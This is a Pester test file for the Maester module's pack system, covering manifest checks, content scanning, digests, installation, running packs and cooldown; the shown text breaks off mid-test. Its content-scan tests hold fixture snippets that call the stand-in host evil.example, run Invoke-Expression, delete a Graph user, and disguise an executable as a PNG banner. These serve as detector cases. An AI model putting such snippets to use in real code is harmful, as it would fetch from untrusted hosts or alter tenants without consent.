BeforeAll {
    Import-Module "$PSScriptRoot/../../Maester.psd1" -Force
    $script:fixture = (Resolve-Path "$PSScriptRoot/../fixtures/packs/sample").Path

    # Every test gets its own pack home and project folder, and none of the pack state of an earlier test.
    function script:Reset-PackState {
        param([string] $Root)
        $env:MAESTER_PACK_HOME = Join-Path $Root 'home'
        $env:MAESTER_PACK_LOCK = $null
        $null = New-Item -Path (Join-Path $Root 'project') -ItemType Directory -Force
        Set-Content -LiteralPath (Join-Path $Root 'project/maester-config.json') -Value '{}'
        InModuleScope Maester {
            $script:__MtPackSet = $null
            $script:__MtPackServices = $null
            $script:__MtLayeredServiceRegistry = $null
            $script:__MtPackModules = $null
            $script:__MtPackModuleOwner = $null
            $script:__MtPackBlocklist = $null
            $script:__MtPackTrust = $null
            $__MtSession.PackConnections = @{}
        }
    }

    # A copy of the sample pack, changed by -Edit, so a test can break it without touching the fixture.
    function script:Copy-SamplePack {
        param([string] $Destination, [scriptblock] $Edit)
        $null = New-Item -Path $Destination -ItemType Directory -Force
        Get-ChildItem -LiteralPath $script:fixture | Copy-Item -Destination $Destination -Recurse -Force
        if ($Edit) { & $Edit $Destination }
        $Destination
    }

    function script:Set-Manifest {
        param([string] $Pack, [scriptblock] $Change)
        $file = Join-Path $Pack 'maester-pack.json'
        $manifest = Get-Content -LiteralPath $file -Raw | ConvertFrom-Json
        & $Change $manifest
        $manifest | ConvertTo-Json -Depth 10 | Set-Content -LiteralPath $file
    }
}

AfterAll {
    $env:MAESTER_PACK_HOME = $null
    InModuleScope Maester {
        $script:__MtPackSet = $null; $script:__MtPackServices = $null; $script:__MtLayeredServiceRegistry = $null
        $script:__MtPackModules = $null; $script:__MtPackModuleOwner = $null; $__MtSession.PackConnections = @{}
    }
}

Describe 'Maester Pack manifest' {
    It 'accepts the sample pack' {
        $result = Test-MtPack $script:fixture
        $result.IsValid | Should -BeTrue -Because (@($result.Errors | ForEach-Object Message) -join ' ')
        $result.Id | Should -Be 'contoso.sample'
        $result.TestIds | Should -Be @('MP.CNT.1001', 'MP.CNT.1002')
        $result.Risk | Should -Be 'Low'
        $result.Digest | Should -Match '^sha256:[0-9a-f]{64}$'
    }

    It 'refuses <Case>' -ForEach @(
        @{ Case = 'an ID that does not start with the publisher'; Change = { param($m) $m.Id = 'fabrikam.sample' }; Code = 'InvalidManifest' }
        @{ Case = 'a reserved code'; Change = { param($m) $m.Code = 'MT' }; Code = 'ReservedCode' }
        @{ Case = 'the maester publisher outside maester365'; Change = { param($m) $m.Id = 'maester.sample'; $m.Publisher = 'maester' }; Code = 'InvalidManifest' }
        @{ Case = 'another runtime'; Change = { param($m) $m | Add-Member Runtime @{ Kind = 'Python' } }; Code = 'RuntimeNotSupported' }
        @{ Case = 'an unknown key under Uses'; Change = { param($m) $m.Uses | Add-Member Secrets @('x') }; Code = 'InvalidManifest' }
        @{ Case = 'a module without an exact version'; Change = { param($m) $m.Uses | Add-Member Modules @(@{ Name = 'Foo'; Version = '1.*' }) }; Code = 'InvalidManifest' }
        @{ Case = 'a user-installed module loaded in Maester''s process'; Change = { param($m) $m.Uses | Add-Member Modules @(@{ Name = 'Foo'; MinimumVersion = '1.0.0'; Install = 'User' }) }; Code = 'InvalidManifest' }
        @{ Case = 'a price that is not Free or Paid'; Change = { param($m) $m | Add-Member Pricing 'Premium' }; Code = 'InvalidManifest' }
        @{ Case = 'a banner outside the pack'; Change = { param($m) $m | Add-Member Banner '../banner.png' }; Code = 'InvalidManifest' }
        @{ Case = 'a banner that is not an image'; Change = { param($m) $m | Add-Member Banner 'banner.svg' }; Code = 'InvalidManifest' }
    ) {
        $pack = Copy-SamplePack -Destination (Join-Path $TestDrive "pack-$([guid]::NewGuid().ToString('n'))") -Edit { param($p) Set-Manifest -Pack $p -Change $Change }
        $result = Test-MtPack $pack
        $result.IsValid | Should -BeFalse
        $result.Errors.Code | Should -Contain $Code
    }

    It 'accepts a user-installed module that runs in a child process, and says so' {
        $pack = Copy-SamplePack -Destination (Join-Path $TestDrive 'child-module') -Edit {
            param($p) Set-Manifest -Pack $p -Change { param($m) $m.Uses | Add-Member Modules @(@{ Name = 'ZeroTrustAssessment'; MinimumVersion = '2.6.0'; Install = 'User'; Process = 'Child' }) }
        }
        $result = Test-MtPack $pack
        $result.IsValid | Should -BeTrue -Because (@($result.Errors | ForEach-Object Message) -join ' ')
        $result.Findings.Code | Should -Contain 'UserModules'
    }

    It 'accepts a code of up to three parts, and refuses <Code>' -ForEach @(
        @{ Code = 'CNT.GWS.ADMIN.X' }, @{ Code = 'CNT..GWS' }, @{ Code = 'CNT.1GWS' }, @{ Code = 'C' }
    ) {
        $pack = Copy-SamplePack -Destination (Join-Path $TestDrive "code-$([guid]::NewGuid().ToString('n'))")
        Set-Manifest -Pack $pack -Change { param($m) $m.Code = 'CNT.GWS' }
        $ok = InModuleScope Maester -Parameters @{ Path = $pack } { param($Path) Read-MtPackManifest -Path $Path }
        @($ok.Errors.Message) -match '^Code must' | Should -BeNullOrEmpty
        $ok.Manifest.Code | Should -Be 'CNT.GWS'

        Set-Manifest -Pack $pack -Change { param($m) $m.Code = $Code }
        $bad = InModuleScope Maester -Parameters @{ Path = $pack } { param($Path) Read-MtPackManifest -Path $Path }
        @($bad.Errors.Message) -match '^Code must' | Should -Not -BeNullOrEmpty
    }

    It 'treats codes as overlapping when one is the other with more parts' {
        InModuleScope Maester {
            Test-MtPackCodeOverlap -Code 'CNT' -Other 'cnt' | Should -BeTrue
            Test-MtPackCodeOverlap -Code 'CNT' -Other 'CNT.GWS' | Should -BeTrue
            Test-MtPackCodeOverlap -Code 'CNT.GWS' -Other 'CNT' | Should -BeTrue
            Test-MtPackCodeOverlap -Code 'CNT.GWS' -Other 'CNT.OKTA' | Should -BeFalse
            Test-MtPackCodeOverlap -Code 'CNT' -Other 'CNTX' | Should -BeFalse
            Test-MtPackTestId -Id 'MP.ZTA' -Code 'ZTA' | Should -BeTrue
            Test-MtPackTestId -Id 'MP.ZTA.21770' -Code 'ZTA' | Should -BeTrue
            Test-MtPackTestId -Id 'MP.ZTAX.1' -Code 'ZTA' | Should -BeFalse
            # A pack that ships with Maester drops the MP prefix.
            Test-MtPackTestId -Id 'ZTA' -Code 'ZTA' -BuiltIn | Should -BeTrue
            Test-MtPackTestId -Id 'ZTA.21770' -Code 'ZTA' -BuiltIn | Should -BeTrue
            Test-MtPackTestId -Id 'MP.ZTA.21770' -Code 'ZTA' -BuiltIn | Should -BeFalse
            Test-MtPackTestId -Id 'ZTA.21770' -Code 'ZTA' | Should -BeFalse
        }
    }

    It 'lets a pack that ships with Maester name its family by its bare code, and nothing else' {
        $root = Join-Path $TestDrive 'builtin-zta'
        $other = Join-Path $TestDrive 'custom-zta'
        $null = New-Item -ItemType Directory -Path $root, $other -Force
        $body = "function Test-ZTA {`n    [CmdletBinding()]`n    [MaesterTest(Id = 'ZTA', Title = 'Zero Trust', Service = 'Graph')]`n    param()`n    `$true`n}`n"
        foreach ($dir in $root, $other) {
            Set-Content -LiteralPath (Join-Path $dir 'Test.ZTA.ps1') -Value $body
            Set-Content -LiteralPath (Join-Path $dir 'Test.ZTA.md') -Value 'Zero Trust'
        }
        InModuleScope Maester -Parameters @{ Root = $root; Other = $other } {
            param($Root, $Other)
            Mock Get-MtBuiltInPack { [pscustomobject]@{ Id = 'maester.zero-trust-assessment'; Root = $Root; Manifest = [pscustomobject]@{ Code = 'ZTA' }; Errors = @() } }
            (Read-MtNativeTest -Path (Join-Path $Root 'Test.ZTA.ps1')).Errors.Message | Should -Not -Match "value 'ZTA' is not valid"
            (Read-MtNativeTest -Path (Join-Path $Other 'Test.ZTA.ps1')).Errors.Message | Should -Match "value 'ZTA' is not valid"
        }
    }

    It 'allows maester365 to publish packs with the maester prefix' {
        $pack = Copy-SamplePack -Destination (Join-Path $TestDrive 'official') -Edit {
            param($p) Set-Manifest -Pack $p -Change { param($m) $m.Id = 'maester.sample'; $m.Publisher = 'maester365' }
        }
        (Test-MtPack $pack -Official).Errors.Message | Should -Not -Match 'must start with the publisher'
    }
}

Describe 'Maester Pack content scan' {
    It 'finds <Case>' -ForEach @(
        @{ Case = 'code that runs when the file loads'; Code = 'CodeOnLoad'; Text = "Write-Output 'loaded'`nfunction Get-CntExtra { 1 }" }
        @{ Case = 'dynamic code'; Code = 'DynamicCode'; Text = "function Get-CntExtra { Invoke-Expression 'Get-Date' }" }
        @{ Case = 'an undeclared network host'; Code = 'UndeclaredNetwork'; Text = "function Get-CntExtra { Invoke-RestMethod -Uri 'https://evil.example/x' }" }
        @{ Case = 'an undeclared host followed by -UserAgent'; Code = 'UndeclaredNetwork'; Text = "function Get-CntExtra { Invoke-RestMethod -Uri 'https://evil.example/x' -UserAgent 'agent' }" }
        @{ Case = 'an undeclared host followed by a switch'; Code = 'UndeclaredNetwork'; Text = "function Get-CntExtra { Invoke-RestMethod -Uri 'https://evil.example/x' -UseBasicParsing }" }
        @{ Case = 'a declared host used as a user name before another host'; Code = 'UndeclaredNetwork'; Text = "function Get-CntExtra { Invoke-RestMethod -Uri 'https://admin.googleapis.com:443@evil.example/x' }" }
        @{ Case = 'a .NET HttpClient'; Code = 'DirectNetwork'; Text = "function Get-CntExtra { [Net.Http.HttpClient]::new().GetStringAsync('https://evil.example/x') }" }
        @{ Case = 'a .NET WebClient made with New-Object'; Code = 'DirectNetwork'; Text = "function Get-CntExtra { (New-Object system.net.webclient).DownloadString('https://evil.example/x') }" }
        @{ Case = 'a request method set at run time'; Code = 'UndeclaredTenantWrite'; Text = "function Get-CntExtra { param(`$m) Invoke-MtGraphRequest -RelativeUri 'users' -Method `$m }" }
        @{ Case = 'a Microsoft Graph command that changes the tenant'; Code = 'UndeclaredTenantWrite'; Text = "function Get-CntExtra { Remove-MgUser -UserId 'someone' }" }
    ) {
        $pack = Copy-SamplePack -Destination (Join-Path $TestDrive "scan-$Code-$([math]::Abs($Case.GetHashCode()))") -Edit { param($p) Set-Content -LiteralPath (Join-Path $p 'helpers/Get-CntExtra.ps1') -Value $Text }
        $result = Test-MtPack $pack
        @($result.Errors.Code) + @($result.Findings.Code) | Should -Contain $Code
    }

    It 'accepts a request to a declared host and a write that Uses.TenantWrites declares' {
        $pack = Copy-SamplePack -Destination (Join-Path $TestDrive 'declared-reach') -Edit { param($p) Set-Content -LiteralPath (Join-Path $p 'helpers/Get-CntExtra.ps1') -Value "function Get-CntExtra { param(`$m) Invoke-RestMethod -Uri 'https://admin.googleapis.com:443/x'; Invoke-MtGraphRequest -RelativeUri 'users' -Method `$m; Remove-MgUser -UserId 'someone' }" }
        Set-Manifest -Pack $pack -Change { param($m) $m.Uses.Network = @('admin.googleapis.com'); $m.Uses | Add-Member TenantWrites @('Removes users') }
        $result = Test-MtPack $pack
        $result.Errors | Should -BeNullOrEmpty
        $result.Findings.Code | Should -Not -Contain 'DirectNetwork'
    }

    It 'rates a binary file High' {
        $pack = Copy-SamplePack -Destination (Join-Path $TestDrive 'binary') -Edit { param($p) [System.IO.File]::WriteAllBytes((Join-Path $p 'helpers/tool.dll'), [byte[]](0x4D, 0x5A, 0, 1, 2, 3)) }
        (Test-MtPack $pack).Risk | Should -Be 'High'
    }

    It 'does not scan the declared banner as binary content when it really is an image' {
        $png = [byte[]](0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0, 0, 0, 0x0D, 0x49, 0x48, 0x44, 0x52)
        $pack = Copy-SamplePack -Destination (Join-Path $TestDrive 'banner') -Edit { param($p) [System.IO.File]::WriteAllBytes((Join-Path $p 'banner.png'), $png) }
        Set-Manifest -Pack $pack -Change { param($m) $m | Add-Member Banner 'banner.png' }
        $result = Test-MtPack $pack
        $result.Risk | Should -Be 'Low'
        $result.Binaries | Should -BeNullOrEmpty
    }

    It 'rates a binary banner High when its bytes are not the image its name says' {
        $pack = Copy-SamplePack -Destination (Join-Path $TestDrive 'fake-banner') -Edit { param($p) [System.IO.File]::WriteAllBytes((Join-Path $p 'banner.png'), [byte[]](0x4D, 0x5A, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9)) }
        Set-Manifest -Pack $pack -Change { param($m) $m | Add-Member Banner 'banner.png' }
        (Test-MtPack $pack).Risk | Should -Be 'High'
    }

    It 'refuses a test whose ID is not under the pack code' {
        $pack = Copy-SamplePack -Destination (Join-Path $TestDrive 'wrong-id') -Edit {
            param($p)
            $file = Join-Path $p 'tests/Test.MP.CNT.1002.ps1'
            (Get-Content -LiteralPath $file -Raw).Replace("'MP.CNT.1002'", "'MP.FAB.1002'") | Set-Content -LiteralPath $file
            Rename-Item -LiteralPath $file -NewName 'Test.MP.FAB.1002.ps1'
            Rename-Item -LiteralPath (Join-Path $p 'tests/Test.MP.CNT.1002.md') -NewName 'Test.MP.FAB.1002.md'
        }
        (Test-MtPack $pack).IsValid | Should -BeFalse
    }
}

Describe 'Maester Pack digest' {
    It 'is the same for the same files and changes with any file' {
        $pack = Copy-SamplePack -Destination (Join-Path $TestDrive 'digest')
        $first = InModuleScope Maester -Parameters @{ Path = $pack } { param($Path) (Get-MtPackDigest -Path $Path).Digest }
        $again = InModuleScope Maester -Parameters @{ Path = $pack } { param($Path) (Get-MtPackDigest -Path $Path).Digest }
        $again | Should -Be $first
        Add-Content -LiteralPath (Join-Path $pack 'tests/Test.MP.CNT.1002.md') -Value 'changed'
        InModuleScope Maester -Parameters @{ Path = $pack } { param($Path) (Get-MtPackDigest -Path $Path).Digest } | Should -Not -Be $first
    }

    It 'ignores an Authenticode signature block, so signing a pack does not change its digest' {
        $pack = Copy-SamplePack -Destination (Join-Path $TestDrive 'signed')
        $before = InModuleScope Maester -Parameters @{ Path = $pack } { param($Path) (Get-MtPackDigest -Path $Path).Digest }
        Add-Content -LiteralPath (Join-Path $pack 'helpers/Get-CntSampleSetting.ps1') -Value "`r`n# SIG # Begin signature block`r`n# MIIabc`r`n# SIG # End signature block"
        InModuleScope Maester -Parameters @{ Path = $pack } { param($Path) (Get-MtPackDigest -Path $Path).Digest } | Should -Be $before
    }
}

Describe 'Installing and loading a pack' {
    BeforeEach {
        $script:root = Join-Path $TestDrive ([guid]::NewGuid().ToString('n'))
        Reset-PackState -Root $script:root
        Push-Location (Join-Path $script:root 'project')
    }
    AfterEach { Pop-Location }

    It 'writes the lock file and the config, and the gate says Ready' {
        $entry = Install-MtPack $script:fixture -NonInteractive -PassThru -AcceptRisk Low 6>$null
        $entry.Id | Should -Be 'contoso.sample'
        $lock = Get-Content -LiteralPath 'maester-packs.lock.json' -Raw | ConvertFrom-Json
        $lock.Packs[0].Digest | Should -Be $entry.Digest
        $lock.Packs[0].Tests | Should -Be @('MP.CNT.1001', 'MP.CNT.1002')
        (Get-Content -LiteralPath 'maester-config.json' -Raw | ConvertFrom-Json).Packs[0].Id | Should -Be 'contoso.sample'
        (Get-MtPack contoso.sample).Status | Should -Be 'Ready'
    }

    It 'returns nothing without -PassThru, and says how to run the pack by its code' {
        $out = Install-MtPack $script:fixture -NonInteractive 6>&1
        @($out | Where-Object { $_ -isnot [System.Management.Automation.InformationRecord] }) | Should -BeNullOrEmpty
        $text = ($out | ForEach-Object { "$_" }) -join "`n" -replace "`e\[[0-9;]*m", ''
        $text | Should -Match 'Installed CNT  contoso\.sample v1\.0\.0'
        $text | Should -Match 'Run only this pack: +Invoke-Maester -Pack CNT -SkipBuiltIn'
        $text | Should -Match 'Connect its service: +Connect-Maester -Service CNT\.Sample'
        $pack = Get-MtPack contoso.sample
        $pack.Code | Should -Be 'CNT'
        $pack.PSObject.TypeNames | Should -Contain 'Maester.Pack'
        ($pack | Format-Table | Out-String -Width 200) | Should -Match 'Code +Name'
    }

    It 'asks for the pack code, shown in a box with the pack''s name and ID, before content younger than the cooldown' {
        $result = InModuleScope Maester {
            $candidate = [pscustomobject]@{
                Kind = 'GitHub'; Owner = 'contoso'; Repo = 'maester-sample'; Folder = $null; Commit = 'abcdef1234567'; Ref = 'main'
                CooldownMet = $false; CooldownHours = 72; AgeHours = 0; AgeSource = 'FirstSeen'; Release = $null; Newer = $null; Archived = $false
                Risk = 'Low'; Findings = @(); Binaries = @(); Modules = @(); TestIds = @('MP.CNT.1001')
                Manifest = [pscustomobject]@{ Id = 'contoso.sample'; Name = 'Contoso sample'; Version = '1.0.0'; Code = 'CNT'; Publisher = 'contoso'; Description = 'A sample.'
                    Connectors = @(); Uses = [pscustomobject]@{ Services = @(); GraphScopes = @(); Network = @(); TenantWrites = @() } }
            }
            $script:prompts = [System.Collections.Generic.List[string]]::new()
            Mock Read-MtPackConfirmation { $script:prompts.Add($Prompt); 'contoso.sample' }
            $wrong = Show-MtPackApproval -Candidate $candidate 6>&1 | Select-Object -Last 1
            Mock Read-MtPackConfirmation { $script:prompts.Add($Prompt); 'CNT' }
            $screen = @(Show-MtPackApproval -Candidate $candidate 6>&1)
            [pscustomobject]@{ Wrong = $wrong; Right = $screen[-1]; Screen = (@($screen | Select-Object -SkipLast 1 | ForEach-Object { "$_" }) -join "`n") -replace "`e\[[0-9;]*m", ''; Prompts = $script:prompts }
        }
        $result.Wrong.Approved | Should -BeFalse
        $result.Wrong.Reason | Should -Match "its code, CNT, not 'contoso\.sample'"
        $result.Right.Approved | Should -BeTrue
        $result.Prompts[0] -replace "`e\[[0-9;]*m", '' | Should -Match 'Type the pack code CNT to install it'
        $result.Screen | Should -Match 'Install a Maester Pack'
        $result.Screen | Should -Match 'CNT +Contoso sample +v1\.0\.0'
        $result.Screen | Should -Match 'contoso\.sample . by contoso'
        $result.Screen | Should -Match 'Cooldown +NOT MET \(72 hours\)'
    }

    It 'does not install a pack above -AcceptRisk without a console' {
        $pack = Copy-SamplePack -Destination (Join-Path $script:root 'risky') -Edit { param($p) Set-Content -LiteralPath (Join-Path $p 'helpers/Get-CntExtra.ps1') -Value "function Get-CntExtra { Invoke-RestMethod -Uri ('https://' + `$env:HOSTX) }" }
        { Install-MtPack $pack -NonInteractive -AcceptRisk Low 6>$null } | Should -Throw
        Test-Path 'maester-packs.lock.json' | Should -BeFalse
    }

    It 'stops running a pack whose stored files changed' {
        $entry = Install-MtPack $script:fixture -NonInteractive -PassThru 6>$null
        $stored = InModuleScope Maester -Parameters @{ Digest = $entry.Digest } { param($Digest) Get-MtPackStorePath -Digest $Digest }
        $file = Join-Path $stored 'helpers/Get-CntSampleSetting.ps1'
        if ($IsWindows) { (Get-Item -LiteralPath $file).IsReadOnly = $false } else { [System.IO.File]::SetUnixFileMode($file, [System.IO.UnixFileMode]'UserRead, UserWrite') }
        Add-Content -LiteralPath $file -Value '# changed'
        $pack = Get-MtPack contoso.sample -WarningAction SilentlyContinue
        $pack.Status | Should -Be 'Unavailable'
        $pack.Reason | Should -Match 'changed after it was approved'
    }

    It 'stops running a pack whose module changed after approval' {
        $entry = Install-MtPack $script:fixture -NonInteractive -PassThru 6>$null
        $modules = Join-Path $env:MAESTER_PACK_HOME 'modules/CntHelper/1.0.0'
        $null = New-Item -Path $modules -ItemType Directory -Force
        Set-Content -LiteralPath (Join-Path $modules 'CntHelper.psd1') -Value "@{ ModuleVersion = '1.0.0'; RootModule = 'CntHelper.psm1' }"
        Set-Content -LiteralPath (Join-Path $modules 'CntHelper.psm1') -Value 'function Get-CntHelper { 1 }'
        # Approve the pack with the module, as Install-MtPack does, then change the module.
        $lock = Get-Content -LiteralPath 'maester-packs.lock.json' -Raw | ConvertFrom-Json
        $digest = InModuleScope Maester -Parameters @{ Path = $modules } { param($Path) (Get-MtPackDigest -Path $Path).Digest }
        $lock.Modules = @([pscustomobject]@{ Name = 'CntHelper'; Version = '1.0.0'; Digest = $digest; Source = 'PSGallery'; RequiredBy = @('contoso.sample') })
        $lock | ConvertTo-Json -Depth 10 | Set-Content -LiteralPath 'maester-packs.lock.json'
        $stored = InModuleScope Maester -Parameters @{ Digest = $entry.Digest } { param($Digest) Get-MtPackStorePath -Digest $Digest }
        InModuleScope Maester -Parameters @{ Path = $stored } { param($Path) Get-ChildItem -LiteralPath $Path -Recurse -Force | ForEach-Object { if ($IsWindows) { if (-not $_.PSIsContainer) { $_.IsReadOnly = $false } } else { [System.IO.File]::SetUnixFileMode($_.FullName, [System.IO.UnixFileMode]'UserRead, UserWrite, UserExecute') } } }
        Set-Manifest -Pack $stored -Change { param($m) $m.Uses | Add-Member Modules @(@{ Name = 'CntHelper'; Version = '1.0.0' }) }
        # The manifest is part of the digest, so record the new digest as an approval would.
        $newDigest = InModuleScope Maester -Parameters @{ Path = $stored } { param($Path) (Get-MtPackDigest -Path $Path).Digest }
        $target = InModuleScope Maester -Parameters @{ Digest = $newDigest } { param($Digest) Get-MtPackStorePath -Digest $Digest }
        Move-Item -LiteralPath $stored -Destination $target
        $lock.Packs[0].Digest = $newDigest
        $lock | ConvertTo-Json -Depth 10 | Set-Content -LiteralPath 'maester-packs.lock.json'
        (Get-MtPack contoso.sample).Status | Should -Be 'Ready'

        Add-Content -LiteralPath (Join-Path $modules 'CntHelper.psm1') -Value 'function Get-CntSecret { 2 }'
        $pack = Get-MtPack contoso.sample -WarningAction SilentlyContinue
        $pack.Status | Should -Be 'Failed'
        $pack.Reason | Should -Match 'changed after it was approved'
    }

    It 'refuses to install a second pack whose code overlaps an installed one' {
        $null = Install-MtPack $script:fixture -NonInteractive 6>$null
        $other = Copy-SamplePack -Destination (Join-Path $script:root 'other') -Edit { param($p) Set-Manifest -Pack $p -Change { param($m) $m.Id = 'contoso.other' } }
        { Install-MtPack $other -NonInteractive 6>$null } | Should -Throw '*overlaps the code CNT of the installed pack contoso.sample*'
    }

    It 'runs only the first of two packs in the lock file whose codes overlap' {
        $null = Install-MtPack $script:fixture -NonInteractive 6>$null
        $lock = Get-Content -LiteralPath 'maester-packs.lock.json' -Raw | ConvertFrom-Json
        $copy = $lock.Packs[0] | ConvertTo-Json -Depth 10 | ConvertFrom-Json
        $copy.Id = 'contoso.copy'
        $lock.Packs = @($lock.Packs[0], $copy)
        $lock | ConvertTo-Json -Depth 10 | Set-Content -LiteralPath 'maester-packs.lock.json'
        (Get-MtPack contoso.sample).Status | Should -Be 'Ready'
        $second = Get-MtPack contoso.copy -WarningAction SilentlyContinue
        $second.Status | Should -Be 'Failed'
        $second.Reason | Should -Match 'overlaps the code CNT of contoso.sample'
    }

    It 'turns a pack off from the config' {
        $null = Install-MtPack $script:fixture -NonInteractive 6>$null
        Set-Content -LiteralPath 'maester-config.json' -Value '{ "Packs": [ { "Id": "contoso.sample", "Enabled": false } ] }'
        (Get-MtPack contoso.sample).Status | Should -Be 'Disabled'
    }

    It 'runs only the packs named with -Pack, by ID or code, whatever the config says' {
        $null = Install-MtPack $script:fixture -NonInteractive 6>$null
        Set-Content -LiteralPath 'maester-config.json' -Value '{ "Packs": [ { "Id": "contoso.sample", "Enabled": false } ] }'
        $lock = (Resolve-Path 'maester-packs.lock.json').Path
        foreach ($name in 'CNT', 'contoso.sample', 'contoso.*') {
            $set = InModuleScope Maester -Parameters @{ Lock = $lock; Name = $name } { param($Lock, $Name) Resolve-MtPackSet -RunConfig (Resolve-MtRunConfig -Path . -WarningAction SilentlyContinue) -LockPath $Lock -Select $Name }
            $row = $set | Where-Object Id -EQ 'contoso.sample'
            $row.Status | Should -Be 'Ready' -Because "-Pack $name names it"
            $row.Selected | Should -BeTrue
        }
        $set = InModuleScope Maester -Parameters @{ Lock = $lock } { param($Lock) Resolve-MtPackSet -LockPath $Lock -Select 'FAB' -WarningVariable warned -WarningAction SilentlyContinue; $script:packWarning = $warned }
        ($set | Where-Object Id -EQ 'contoso.sample').ReasonCode | Should -Be 'NotSelected'
        (InModuleScope Maester { $script:packWarning }) -join ' ' | Should -Match "-Pack 'FAB' matches no pack"
    }

    It 'runs an installed pack only when named or with -AllPacks, and its long-running tests when named with -Pack' {
        $pack = Copy-SamplePack -Destination (Join-Path $script:root 'long') -Edit {
            param($p)
            $file = Join-Path $p 'tests/Test.MP.CNT.1002.ps1'
            (Get-Content -LiteralPath $file -Raw).Replace("Severity = 'Info'", "Severity = 'Info',`n        LongRunning") | Set-Content -LiteralPath $file
        }
        $null = Install-MtPack $pack -NonInteractive 6>$null
        # -SkipBuiltIn runs the custom tests under -Path, so give it one.
        Set-Content -LiteralPath 'Test.CONTOSO.1.ps1' -Value "function Test-ContosoOne { [MaesterTest(Id = 'CONTOSO.1', Title = 'One', Severity = 'Info')] param() `$true }"
        # Installing a pack does not add it to every run: it runs when named, or with -AllPacks.
        $rows = @(Invoke-Maester -SkipBuiltIn -Path . -DryRun -PassThru -NonInteractive -SkipGraphConnect -OutputFolder (Join-Path $script:root 'out') 6>$null).Tests
        @($rows | Where-Object Id -Like 'MP.CNT.*') | Should -BeNullOrEmpty
        $rows = @(Invoke-Maester -SkipBuiltIn -Path . -AllPacks -DryRun -PassThru -NonInteractive -SkipGraphConnect -OutputFolder (Join-Path $script:root 'out') 6>$null).Tests
        ($rows | Where-Object Id -EQ 'MP.CNT.1002').ReasonCode | Should -Be 'LongRunning'
        $rows = @(Invoke-Maester -SkipBuiltIn -Path . -Pack CNT -DryRun -PassThru -NonInteractive -SkipGraphConnect -OutputFolder (Join-Path $script:root 'out') 6>$null).Tests
        ($rows | Where-Object Id -EQ 'MP.CNT.1002').ReasonCode | Should -Be 'DryRun'
        # A pack's test ID names its pack.
        $rows = @(Invoke-Maester -Path . -TestId 'MP.CNT.1002' -DryRun -PassThru -NonInteractive -SkipGraphConnect -OutputFolder (Join-Path $script:root 'out') 6>$null).Tests
        ($rows | Where-Object Id -EQ 'MP.CNT.1002').ReasonCode | Should -Be 'DryRun'
    }

    It 'removes the pack with Uninstall-MtPack' {
        $null = Install-MtPack $script:fixture -NonInteractive 6>$null
        Uninstall-MtPack contoso.sample
        (Get-Content -LiteralPath 'maester-packs.lock.json' -Raw | ConvertFrom-Json).Packs | Should -BeNullOrEmpty
        Get-MtPack contoso.sample | Should -BeNullOrEmpty
    }

    It 'restores a pack from the lock file and refuses files that differ' {
        $entry = Install-MtPack $script:fixture -NonInteractive -PassThru 6>$null
        $stored = InModuleScope Maester -Parameters @{ Digest = $entry.Digest } { param($Digest) Get-MtPackStorePath -Digest $Digest }
        InModuleScope Maester -Parameters @{ Path = $stored } { param($Path) Get-ChildItem -LiteralPath $Path -Recurse -Force | ForEach-Object { if ($IsWindows) { if (-not $_.PSIsContainer) { $_.IsReadOnly = $false } } else { [System.IO.File]::SetUnixFileMode($_.FullName, [System.IO.UnixFileMode]'UserRead, UserWrite, UserExecute') } } }
        Remove-Item -LiteralPath $stored -Recurse -Force
        (Restore-MtPack | Where-Object Kind -EQ 'Pack').Status | Should -Be 'Restored'
        (Get-MtPack contoso.sample).Status | Should -Be 'Ready'

        $lock = Get-Content -LiteralPath 'maester-packs.lock.json' -Raw | ConvertFrom-Json
        $lock.Packs[0].Digest = 'sha256:' + ('0' * 64)
        $lock | ConvertTo-Json -Depth 10 | Set-Content -LiteralPath 'maester-packs.lock.json'
        (Restore-MtPack -ErrorAction SilentlyContinue -WarningAction SilentlyContinue | Where-Object Kind -EQ 'Pack').Status | Should -Be 'Failed'
    }
}

Describe 'Running a pack' {
    BeforeEach {
        $script:root = Join-Path $TestDrive ([guid]::NewGuid().ToString('n'))
        Reset-PackState -Root $script:root
    }

    It 'skips a test whose connector service is not connected, naming the command that connects it' {
        $rows = @(Invoke-MtTest -Path $script:fixture)
        $row = $rows | Where-Object Id -EQ 'MP.CNT.1001'
        $row.Result | Should -Be 'Skipped'
        $row.ReasonCode | Should -Be 'ServiceNotConnected'
        $row.ReasonDetail | Should -Be 'Not connected to Contoso Sample. Run Connect-Maester -Service CNT.Sample.'
        ($rows | Where-Object Id -EQ 'MP.CNT.1002').Result | Should -Be 'Passed'
    }

    It 'connects through the connector and runs the test with its helper' {
        $null = Invoke-MtTest -Path $script:fixture
        Connect-Maester -Service CNT.Sample -ServiceSetting @{ Tenant = 'fabrikam' } 6>$null | Out-Null
        Test-MtConnection -Service CNT.Sample | Should -BeTrue
        (Get-MtConnectionState -Service CNT.Sample -Detailed).Account | Should -Be 'admin@fabrikam.example'

        $row = Invoke-MtTest -Path (Join-Path $script:fixture 'tests/Test.MP.CNT.1001.ps1')
        $row.Result | Should -Be 'Passed'
        $row.Source | Should -Be 'Custom'
        $row.Package.Id | Should -Be 'contoso.sample'
        $row.Package.Runtime | Should -Be 'Script'

        Disconnect-Maester
        Test-MtConnection -Service CNT.Sample | Should -BeFalse
    }

    It 'refuses a service that no pack provides' {
        { Test-MtConnection -Service CNT.Nothing } | Should -Throw '*not a service Maester knows*'
    }

    It 'needs -Service to read a connection from outside a pack' {
        $null = Invoke-MtTest -Path $script:fixture
        { Get-MtConnectionState } | Should -Throw '*-Service*'
    }

    It 'reads a connector setting from the environment and refuses a secret in the config' {
        $null = Invoke-MtTest -Path $script:fixture
        $env:MAESTER_CNT_SAMPLE_TENANT = 'woodgrove'
        try {
            $config = [pscustomobject]@{ Connections = [pscustomobject]@{ 'CNT.Sample' = [pscustomobject]@{ Tenant = 'contoso'; ApiToken = 'x' } } }
            $settings = InModuleScope Maester -Parameters @{ Config = $config } { param($Config) Get-MtPackConnectorSetting -Service CNT.Sample -RunConfig $Config -Explicit @{} }
            $settings.Tenant | Should -Be 'woodgrove'
        } finally {
            $env:MAESTER_CNT_SAMPLE_TENANT = $null
        }
    }
}

Describe 'Pack cooldown' {
    BeforeEach { Reset-PackState -Root (Join-Path $TestDrive ([guid]::NewGuid().ToString('n'))) }

    It 'starts the clock when this computer first sees a commit, so a moved tag starts again' {
        InModuleScope Maester {
            $first = Get-MtPackFirstSeen -RepositoryId 42 -Commit ('a' * 40)
            Start-Sleep -Milliseconds 20
